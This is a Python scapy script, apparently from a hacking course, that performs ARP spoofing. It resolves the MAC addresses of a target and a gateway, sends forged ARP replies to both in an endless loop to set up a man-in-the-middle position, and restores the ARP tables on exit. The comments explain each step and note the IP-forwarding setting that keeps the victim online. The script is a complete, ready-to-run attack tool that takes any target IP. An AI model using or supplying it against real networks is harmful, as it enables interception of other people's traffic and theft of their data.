#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
# By default packet, scapy.ls(scapy.ARP) would also show value of op = 1 which is default for ARP request.
# But, here we will also need op = 2, which is for ARP Response.

# We're creating an object of ARP and storing it in a packet variable. We're doing this to send a response to victim saying that I have Router/Gateway's MAC address.
# destination ip and mac for windows VM. Source IP is ip of the router. So, the victim will feel that the packet is coming from psrc (which is gateway here) and not attacker.
#packet = scapy.ARP(op = 2, pdst = "172.16.61.200", hwdst = "00:0c:29:bb:4e:db", psrc = "172.16.61.2")
#print(packet.show())
#print(packet.summary())  # It will say that the router is at attacker's mac address.

def get_mac(ip):   # Takes an IP address and returns it's mac address.
    arp_request = scapy.ARP(pdst = ip) # create an ARP object
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")        # Create an ethernet object
    arp_request_broadcast = broadcast/arp_request # Appending broadcast with arp message i.e. combination of two.
    # answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)  # SR means send and receive. 'srp' means send and receive with a custom ether part.
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # SR means send and receive. 'srp' means send and receive with a custom ether part.
    # All we need is the first element and that we can get through answered_list[0]. First element = answered_list[0]
    # Therefore to get it's psrc. We can simply do answered_list[0][1].psrc for the ip of the first element.
    # print(answered_list[0][1].psrc)
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # No need of source mac as scapy will default use our source mac.
    scapy.send(packet, verbose = False)  # If not verbose = True default then it'll keep on displaying "Sent 1 packets."


#get_mac("172.16.61.2")

# As soon as the victim uses internet, it'll go back to the correct router address.
# This is because we only sent a single spoof. We should put it in a loop and continue it as long as the attack exists.
#spoof("172.16.61.2", "172.16.61.200")
#spoof("172.16.61.200", "172.16.61.2")

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # op = 2 ARP response
    # Here we need to specifically tell scapy to take source ip as psrc and we need to set hwsrc as router's mac address.
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)  # Sending this packet 4 times and verbose False.

target_ip = input("Enter your target IP: ")
gateway_ip = input("Enter your gateway IP: ")

sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count += 2
        #print("[+] Packets sent: " + str(sent_packet_count))
        # In the  print above, we can simply write a ',' at the end so to add the result of the print to the buffer.
        # To get it out of the buffer, we want to flush it
        #print("\r[+] Packets sent: " + str(sent_packet_count)),     # '\r' means that override and print over it. Start from the line.
        #sys.stdout.flush()

        # In python3 we can simply use a combination of '/r' and end = '' to keep it in a single line and override it.
        print("\r[+] Packets sent: " + str(sent_packet_count), end = '')
        time.sleep(2)  # So that we don't send a lot of packets. This will sleep for 2 seconds and then again send 2 packets.

    # We also need to allow Kali machine to allow packet forwarding, otherwise our victim won't be able to use internet.
    # echo 1 > /proc/sys/net/ipv4/ip_forward

except KeyboardInterrupt:
    print("\n[+] Detected Ctrl + C .... Resetting ARP Tables!")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("All Done!")
